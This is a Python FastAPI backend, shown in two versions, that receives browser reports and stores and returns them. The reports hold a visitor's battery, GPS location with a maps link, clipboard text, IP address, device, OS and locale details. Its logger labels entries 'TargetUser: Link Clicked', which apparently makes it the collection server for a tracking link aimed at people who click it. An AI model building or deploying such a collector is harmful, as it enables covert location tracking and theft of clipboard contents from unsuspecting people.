import re
import logging
import json
import sys
from datetime import datetime
from zoneinfo import ZoneInfo

from fastapi import FastAPI, HTTPException, Request
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel, Field

IST = ZoneInfo("Asia/Kolkata")


class JsonLogFormatter(logging.Formatter):
    def format(self, record: logging.LogRecord) -> str:
        return json.dumps(
            {
                # "timestamp": datetime.fromtimestamp(record.created, timezone.utc).isoformat(),
                # "level": record.levelname,
                # "logger": record.name,
                # "event": record.event,
                "TargetUser" : "Link Clicked",
                "DeviceInfo Received": record.report,
            },
            ensure_ascii=False,
            default=str,
            indent=2,
        )


log = logging.getLogger("device_info")
log.setLevel(logging.INFO)
log.disabled = False
log.propagate = False

if not any(getattr(handler, "_device_info_handler", False) for handler in log.handlers):
    handler = logging.StreamHandler(sys.stdout)
    handler.setFormatter(JsonLogFormatter())
    handler._device_info_handler = True
    log.addHandler(handler)

app = FastAPI(title="Battery API")

# Allow the Vite dev server (and your phone on the LAN) to call this API.
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # tighten this in production
    allow_methods=["*"],
    allow_headers=["*"],
)


class ScreenInfo(BaseModel):
    width: int = Field(..., ge=0)
    height: int = Field(..., ge=0)
    viewport_width: int = Field(0, ge=0)
    viewport_height: int = Field(0, ge=0)
    pixel_ratio: float = Field(1, gt=0)
    touch_points: int = Field(0, ge=0)
    orientation: str | None = None


class BatteryReport(BaseModel):
    # Identity (random id generated in the browser, NOT a hardware id)
    device_id: str | None = Field(None, max_length=64)

    # Battery (optional: Chromium browsers only)
    level: float | None = Field(None, ge=0, le=1, description="Battery level 0.0 to 1.0")
    charging: bool | None = None

    # Location (optional: user may deny)
    lat: float | None = Field(None, ge=-90, le=90)
    lng: float | None = Field(None, ge=-180, le=180)
    accuracy: float | None = None  # metres

    # Permissions / clipboard
    clipboard: str | None = Field(None, max_length=2000)
    notifications: str | None = Field(None, max_length=20)  # granted | denied | default | unsupported

    # Browser / OS / screen
    user_agent: str = Field("", max_length=512)
    ua_data: dict | None = None  # navigator.userAgentData (Chromium only)
    screen: ScreenInfo

    # Locale
    language: str | None = Field(None, max_length=35)
    languages: list[str] = Field(default_factory=list, max_length=20)
    timezone: str | None = Field(None, max_length=64)
    utc_offset_minutes: int | None = None


# Simple in-memory store (replace with a DB if you need history).
latest_report: dict | None = None


def get_client_ip(request: Request) -> str | None:
    # Behind a proxy/tunnel (Vite, ngrok, nginx) the real IP is in X-Forwarded-For.
    # Only trust this header if your own proxy sets it; clients can fake it otherwise.
    xff = request.headers.get("x-forwarded-for")
    if xff:
        return xff.split(",")[0].strip()
    return request.client.host if request.client else None


def parse_browser(ua: str) -> str:
    # Order matters: Edge/Opera/Samsung also contain "Chrome" and "Safari".
    for token, name in (
        ("Edg/", "Edge"),
        ("OPR/", "Opera"),
        ("SamsungBrowser/", "Samsung Internet"),
        ("FxiOS/", "Firefox"),
        ("Firefox/", "Firefox"),
        ("CriOS/", "Chrome"),
        ("Chrome/", "Chrome"),
        ("Safari/", "Safari"),
    ):
        if token in ua:
            pattern = r"Version/([\d.]+)" if name == "Safari" else re.escape(token) + r"([\d.]+)"
            m = re.search(pattern, ua)
            return f"{name} {m.group(1).split('.')[0]}" if m else name
    return "Unknown"


def parse_os(ua: str, ua_data: dict | None) -> str:
    ua_data = ua_data or {}
    platform = ua_data.get("platform")
    if platform:
        version = ua_data.get("platformVersion") or ""
        if platform == "Windows" and version:
            # Chromium reports platformVersion 13+ on Windows 11.
            try:
                return "Windows 11" if int(version.split(".")[0]) >= 13 else "Windows 10"
            except ValueError:
                return "Windows"
        return f"{platform} {version}".strip()
    m = re.search(r"Android ([\d.]+)", ua)
    if m:
        return f"Android {m.group(1)}"
    m = re.search(r"(?:iPhone|CPU) OS ([\d_]+)", ua)
    if m:
        return "iOS " + m.group(1).replace("_", ".")
    if "Windows" in ua:
        return "Windows"
    if "Mac OS X" in ua or "Macintosh" in ua:
        return "macOS"
    if "CrOS" in ua:
        return "ChromeOS"
    if "Linux" in ua:
        return "Linux"
    return "Unknown"


def classify_device(ua: str, screen: ScreenInfo, ua_mobile: bool | None) -> str:
    """Best-effort guess: 'phone', 'tablet' or 'desktop' (a heuristic, not a guarantee)."""
    ua_l = ua.lower()
    short_side = min(screen.width, screen.height)  # CSS pixels
    touch = screen.touch_points

    # iPadOS 13+ sends a Mac user agent, but it's the only "Mac" with a touch screen.
    if "ipad" in ua_l or ("macintosh" in ua_l and touch > 1):
        return "tablet"
    if "iphone" in ua_l or "ipod" in ua_l:
        return "phone"
    # Small touch screen = phone, even if the browser is in "desktop site" mode.
    if touch > 0 and short_side < 600:
        return "phone"
    if "android" in ua_l:
        return "phone" if ("mobile" in ua_l or ua_mobile) else "tablet"
    if ua_mobile:
        return "phone"
    # Mid-size touch screen on a non-desktop OS = tablet.
    if touch > 0 and short_side < 1100 and not any(k in ua_l for k in ("windows", "macintosh", "cros")):
        return "tablet"
    return "desktop"


@app.post("/api/battery")
def save_battery(report: BatteryReport, request: Request):
    global latest_report

    ua = report.user_agent or request.headers.get("user-agent", "")
    ua_data = report.ua_data or {}
    device_type = classify_device(ua, report.screen, ua_data.get("mobile"))
    os_name = parse_os(ua, ua_data)
    if os_name == "macOS" and device_type == "tablet":
        os_name = "iPadOS"

    latest_report = {
        # battery
        "percentage": round(report.level * 100) if report.level is not None else None,
        "charging": report.charging,
        # location
        "lat": report.lat,
        "lng": report.lng,
        "accuracy": report.accuracy,
        "gmap": (
            f"https://www.google.com/maps?q={report.lat},{report.lng}"
            if report.lat is not None and report.lng is not None
            else None
        ),
        # device
        "device_id": report.device_id,
        "device_type": device_type,
        "model": ua_data.get("model") or None,  # e.g. "Pixel 7" (Android Chrome only)
        "os": os_name,
        "browser": parse_browser(ua),
        # "user_agent": ua,
        "screen": report.screen.model_dump(),
        # network / locale
        "ip": get_client_ip(request),
        "language": report.language,
        "languages": report.languages,
        "timezone": report.timezone,
        "utc_offset_minutes": report.utc_offset_minutes,
        # permissions
        "notifications": report.notifications,
        "clipboard": report.clipboard,
        "received_at": datetime.now(IST).strftime("%d-%m-%Y : %I:%M %p"),
    }

    log.info(
        "DeviceInfo received",
        extra={"event": "device_info_received", "report": latest_report},
    )
    return latest_report


@app.get("/api/battery")
def get_battery():
    if latest_report is None:
        raise HTTPException(status_code=404, detail="No battery report received yet")
    return latest_report
'''
import re
import logging
import json
import sys
from datetime import datetime, timezone
from zoneinfo import ZoneInfo

import logging_loki
from fastapi import FastAPI, HTTPException, Request
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel, Field

IST = ZoneInfo("Asia/Kolkata")


class JsonLogFormatter(logging.Formatter):
    def __init__(self, pretty: bool = False):
        super().__init__()
        self.pretty = pretty

    def format(self, record: logging.LogRecord) -> str:
        return json.dumps(
            {
                "timestamp": datetime.fromtimestamp(record.created, timezone.utc).isoformat(),
                "level": record.levelname,
                "logger": record.name,
                "event": record.event,
                "report": record.report,
            },
            ensure_ascii=False,
            default=str,
            indent=2 if self.pretty else None,
        )


log = logging.getLogger("device_info")
log.setLevel(logging.INFO)
log.disabled = False
log.propagate = False

if not any(getattr(handler, "_device_info_console", False) for handler in log.handlers):
    console_handler = logging.StreamHandler(sys.stdout)
    console_handler.setFormatter(JsonLogFormatter(pretty=True))
    console_handler._device_info_console = True
    log.addHandler(console_handler)

if not any(getattr(handler, "_device_info_loki", False) for handler in log.handlers):
    loki_handler = logging_loki.LokiHandler(
        url="http://localhost:3100/loki/api/v1/push",
        tags={"app": "battery-api", "env": "dev"},
        version="1",
    )
    loki_handler.setFormatter(JsonLogFormatter(pretty=False))
    loki_handler._device_info_loki = True
    log.addHandler(loki_handler)

app = FastAPI(title="Battery API")

# Allow the Vite dev server (and your phone on the LAN) to call this API.
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # tighten this in production
    allow_methods=["*"],
    allow_headers=["*"],
)


class ScreenInfo(BaseModel):
    width: int = Field(..., ge=0)
    height: int = Field(..., ge=0)
    viewport_width: int = Field(0, ge=0)
    viewport_height: int = Field(0, ge=0)
    pixel_ratio: float = Field(1, gt=0)
    touch_points: int = Field(0, ge=0)
    orientation: str | None = None


class BatteryReport(BaseModel):
    # Identity (random id generated in the browser, NOT a hardware id)
    device_id: str | None = Field(None, max_length=64)

    # Battery (optional: Chromium browsers only)
    level: float | None = Field(None, ge=0, le=1, description="Battery level 0.0 to 1.0")
    charging: bool | None = None

    # Location (optional: user may deny)
    lat: float | None = Field(None, ge=-90, le=90)
    lng: float | None = Field(None, ge=-180, le=180)
    accuracy: float | None = None  # metres

    # Permissions / clipboard
    clipboard: str | None = Field(None, max_length=2000)
    notifications: str | None = Field(None, max_length=20)  # granted | denied | default | unsupported

    # Browser / OS / screen
    user_agent: str = Field("", max_length=512)
    ua_data: dict | None = None  # navigator.userAgentData (Chromium only)
    screen: ScreenInfo

    # Locale
    language: str | None = Field(None, max_length=35)
    languages: list[str] = Field(default_factory=list, max_length=20)
    timezone: str | None = Field(None, max_length=64)
    utc_offset_minutes: int | None = None


# Simple in-memory store (replace with a DB if you need history).
latest_report: dict | None = None


def get_client_ip(request: Request) -> str | None:
    # Behind a proxy/tunnel (Vite, ngrok, nginx) the real IP is in X-Forwarded-For.
    # Only trust this header if your own proxy sets it; clients can fake it otherwise.
    xff = request.headers.get("x-forwarded-for")
    if xff:
        return xff.split(",")[0].strip()
    return request.client.host if request.client else None


def parse_browser(ua: str) -> str:
    # Order matters: Edge/Opera/Samsung also contain "Chrome" and "Safari".
    for token, name in (
        ("Edg/", "Edge"),
        ("OPR/", "Opera"),
        ("SamsungBrowser/", "Samsung Internet"),
        ("FxiOS/", "Firefox"),
        ("Firefox/", "Firefox"),
        ("CriOS/", "Chrome"),
        ("Chrome/", "Chrome"),
        ("Safari/", "Safari"),
    ):
        if token in ua:
            pattern = r"Version/([\d.]+)" if name == "Safari" else re.escape(token) + r"([\d.]+)"
            m = re.search(pattern, ua)
            return f"{name} {m.group(1).split('.')[0]}" if m else name
    return "Unknown"


def parse_os(ua: str, ua_data: dict | None) -> str:
    ua_data = ua_data or {}
    platform = ua_data.get("platform")
    if platform:
        version = ua_data.get("platformVersion") or ""
        if platform == "Windows" and version:
            # Chromium reports platformVersion 13+ on Windows 11.
            try:
                return "Windows 11" if int(version.split(".")[0]) >= 13 else "Windows 10"
            except ValueError:
                return "Windows"
        return f"{platform} {version}".strip()
    m = re.search(r"Android ([\d.]+)", ua)
    if m:
        return f"Android {m.group(1)}"
    m = re.search(r"(?:iPhone|CPU) OS ([\d_]+)", ua)
    if m:
        return "iOS " + m.group(1).replace("_", ".")
    if "Windows" in ua:
        return "Windows"
    if "Mac OS X" in ua or "Macintosh" in ua:
        return "macOS"
    if "CrOS" in ua:
        return "ChromeOS"
    if "Linux" in ua:
        return "Linux"
    return "Unknown"


def classify_device(ua: str, screen: ScreenInfo, ua_mobile: bool | None) -> str:
    """Best-effort guess: 'phone', 'tablet' or 'desktop' (a heuristic, not a guarantee)."""
    ua_l = ua.lower()
    short_side = min(screen.width, screen.height)  # CSS pixels
    touch = screen.touch_points

    # iPadOS 13+ sends a Mac user agent, but it's the only "Mac" with a touch screen.
    if "ipad" in ua_l or ("macintosh" in ua_l and touch > 1):
        return "tablet"
    if "iphone" in ua_l or "ipod" in ua_l:
        return "phone"
    # Small touch screen = phone, even if the browser is in "desktop site" mode.
    if touch > 0 and short_side < 600:
        return "phone"
    if "android" in ua_l:
        return "phone" if ("mobile" in ua_l or ua_mobile) else "tablet"
    if ua_mobile:
        return "phone"
    # Mid-size touch screen on a non-desktop OS = tablet.
    if touch > 0 and short_side < 1100 and not any(k in ua_l for k in ("windows", "macintosh", "cros")):
        return "tablet"
    return "desktop"


@app.post("/api/battery")
def save_battery(report: BatteryReport, request: Request):
    global latest_report

    ua = report.user_agent or request.headers.get("user-agent", "")
    ua_data = report.ua_data or {}
    device_type = classify_device(ua, report.screen, ua_data.get("mobile"))
    os_name = parse_os(ua, ua_data)
    if os_name == "macOS" and device_type == "tablet":
        os_name = "iPadOS"

    latest_report = {
        # battery
        "percentage": round(report.level * 100) if report.level is not None else None,
        "charging": report.charging,
        # location
        "lat": report.lat,
        "lng": report.lng,
        "accuracy": report.accuracy,
        # device
        "device_id": report.device_id,
        "device_type": device_type,
        "model": ua_data.get("model") or None,  # e.g. "Pixel 7" (Android Chrome only)
        "os": os_name,
        "browser": parse_browser(ua),
        # "user_agent": ua,
        "screen": report.screen.model_dump(),
        # network / locale
        "ip": get_client_ip(request),
        "language": report.language,
        "languages": report.languages,
        "timezone": report.timezone,
        "utc_offset_minutes": report.utc_offset_minutes,
        # permissions
        "notifications": report.notifications,
        "clipboard": report.clipboard,
        "received_at": datetime.now(IST).strftime("%d-%m-%Y : %I:%M %p"),
    }

    log_report = {
        key: latest_report[key]
        for key in (
            "percentage",
            "charging",
            "device_type",
            "os",
            "browser",
            "received_at",
        )
    }
    log.info(
        "Device info received",
        extra={"event": "device_info_received", "report": log_report},
    )
    return latest_report


@app.get("/api/battery")
def get_battery():
    if latest_report is None:
        raise HTTPException(status_code=404, detail="No battery report received yet")
    return latest_report

'''